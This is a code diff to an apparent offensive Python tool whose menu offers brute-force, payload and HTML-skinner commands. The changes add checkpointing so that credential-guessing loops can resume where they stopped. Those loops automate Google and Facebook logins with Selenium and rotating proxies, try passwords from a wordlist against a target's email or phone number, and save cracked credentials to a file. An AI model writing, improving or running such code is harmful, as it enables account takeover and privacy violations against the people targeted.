@@ -17,7 +17,8 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from bs4 import BeautifulSoup as beautifulsoup
-from generate import take_keywords
+from data.generate import take_keywords
+from data.memory import memory
 
 black = "\033[2;30m"
 red = "\033[1;31m"
@@ -242,13 +243,15 @@ def proxy_errorV(errorLogged = None, terminate = None):
       onload_proxy(pop = terminate)
       logging.error(errorLogged)
       print(f'{red}Proxy connection failed{plain}')
-      
+    if 'net::ERR_CONNECTION_CLOSED' in errorLogged:
+      logging.warning(errorLogged)
+      print(f'{red}No internet connection{plain}')
     else:
       print(errorLogged)
-      
-    
-def main(): 
-  os.system('cls' if os.name == 'nt' else 'clear') 
+
+
+def main():
+  os.system('cls' if os.name == 'nt' else 'clear')
   password_file = settings[5].split(':')[1]
   logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
   
@@ -257,8 +260,8 @@ def main():
     
   save_passwords = open('data/temps.txt', 'a')
     
-
-  holder = rf"""
+  def load_banner():
+    holder = rf"""
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
    |   | |\ | | | '\/    |\/| / \ |\ | (_   |  |_  |_)
@@ -266,23 +269,24 @@ def main():
    ~~~ ~ ~  ~ `~' ~  ~   ~  ~  ~  ~  ~  ~   ~  ~~~ ~ ~
                                      {dp_blue}𝙱𝚎 𝚝𝚑𝚎    𝚖𝚘𝚗𝚜𝚝𝚎𝚛{blue}
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜              𝙿𝚛𝚘𝚡𝚢 - {proxy_status()}
+   𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜                       𝙿𝚛𝚘𝚡𝚢 - {proxy_status()}
    
-   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎           {dp_blue}𝙿𝚊𝚢𝚕𝚘𝚊𝚍
-   {green}𝙷𝚝𝚖𝚕 𝚜𝚔𝚒𝚗𝚗𝚎𝚛          {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
-   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜              𝙷𝚎𝚕𝚙
-   {red}𝙴𝚡𝚒𝚝{plain} 
+   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎                    {dp_blue}𝙿𝚊𝚢𝚕𝚘𝚊𝚍
+   {green}𝙷𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛                   {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
+   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜                       𝙷𝚎𝚕𝚙
+   {plain}𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍                       𝙴𝚡𝚒𝚝 
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}  𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
+   {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}     𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-  """
+    """
   
-  print(f'{blue}{textwrap.dedent(holder)}{plain}')
+    print(f'{blue}{textwrap.dedent(holder)}{plain}')
+  load_banner()
   bs = beautifulsoup
   command = True
   while command:
-    command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒.𝚎 [𝚑𝚝𝚖𝚕 𝚘𝚛 𝚑𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛] : {plain}')
-    command.strip()
+    command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}')
+    command = command.strip()
     if command.lower() in ['brute', 'brute-force']:
       if sanitize_json_bool(settings[2].strip()):
         temp_disable = input(f'{blue}Temporarily disable proxy for now [Yes | No] : {plain}').lower()
@@ -336,8 +340,10 @@ def main():
               wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
               driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
               captcha = []
-            
-            for i in range(len(pass_)):
+            read_mem = memory(email_or_phone,1,None,onload_file(password_file))
+            index_h = read_mem.read_()
+            i = index_h if index_h != None else 0
+            while i < len(pass_):
               check_password = pass_[i]
               try:
                 wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@type="password"]')))
@@ -349,7 +355,8 @@ def main():
                 wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
                 
                 print(f'{red}Incorrect password : {check_password} {plain}')
-                  
+                save_mem = memory(email_or_phone,1,check_password,onload_file(password_file))
+                save_mem.update_()
               except selenium.common.exceptions.TimeoutException:
                 
                 page_ = bs(driver.page_source, 'html.parser').text
@@ -375,20 +382,29 @@ def main():
                   print(f'{green}Correct password : {check_password}{plain}')
                   driver.quit()
                   save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
+                  del_mem = memory(email_or_phone,1,None,None)
+                  del_mem.terminate_()
                   break
                 else:
                   pass
+              i += 1
+            del_mem = memory(email_or_phone,1,None,None)
+            del_mem.terminate_()
+              
           except Exception:
             track = traceback.format_exc()
             proxy_errorV(errorLogged = track, terminate = caught_proxy)
             driver.quit()
           
         if tar in ['facebook','2']:
-          username_email = input(f'\n{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
+          username_email = input(f'{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
           if username_email.lower() in ['exit']:
             break
           
-          for i in range(len(pass_)):
+          read_mem = memory(username_email,2,None,onload_file(password_file))
+          index_h = read_mem.read_()
+          i = index_h if index_h != None else 0
+          while i < len(pass_):
             check_password = pass_[i]
             caught_proxy = onload_proxy()
             if caught_proxy != None and disable_now == False:
@@ -400,7 +416,6 @@ def main():
             driver = webdriver.Chrome(options = options)
             try:
               driver.get(sign_in_face)
-                  
               time.sleep(5)
               page_ = bs(driver.page_source, 'html.parser').text
               if r"This site can’t be reached" in page_:
@@ -436,6 +451,8 @@ def main():
                   if "incorrect" in page_content:
                     print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
                     driver.quit()
+                    save_mem = memory(username_email,2,check_password,onload_file(password_file))
+                    save_mem.update_()
                 except selenium.common.exceptions.TimeoutException as sel_timer:
                   page_now = bs(driver.page_source, 'html.parser').text
                   if "Find your account" in page_now:
@@ -446,11 +463,15 @@ def main():
                     print(f'{yellow}Correct password {check_password} [ might have 2 factor authentication {plain}]', flush = True)
                     driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
+                    del_mem = memory(username_email,2,None,None)
+                    del_mem.terminate_()
                     break
-                  if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information' in page_content:
+                  if  'Find friends' in page_now or 'authentication' in page_now or 'recovery information' in page_now:
                     print(f'{yellow} {check_password} is the correct password{plain}')
                     driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
+                    del_mem = memory(username_email,2,None,None)
+                    del_mem.terminate_()
                   else:
                     logging.critical(sel_timer)
                     print(f'{red}Await response timeout{plain}')
@@ -458,7 +479,7 @@ def main():
                     pass
                     
                 except selenium.common.exceptions.NoSuchElementException as sel_err:
-                  logging.error(sel_err)
+                  logging.critical(sel_err)
                   print(f'{red}Kindly inform the developer of this error, once spotted{plain}')
                   driver.quit()
               else:
@@ -470,7 +491,11 @@ def main():
               driver.quit()
               break
             
-          driver.quit()
+            driver.quit()
+            i += 1
+          del_mem = memory(username_email,2,None,None)
+          del_mem.terminate_()
+        
           
         elif tar in ['exit','3']:
           br = False
@@ -655,7 +680,9 @@ def main():
       take_keywords()
     elif command.lower().strip() == 'help':
       subprocess.run(['xdg-open', 'https://github.com/harkerbyte/linux-monster#support'])
-      
+    elif command.lower() == 'clear':
+      os.system('cls' if os.name == 'nt' else 'clear')
+      load_banner()
     elif command.lower() in ['dev', 'developer']:
       subprocess.run(['xdg-open', 'https://github.com/harkerbyte'])
 
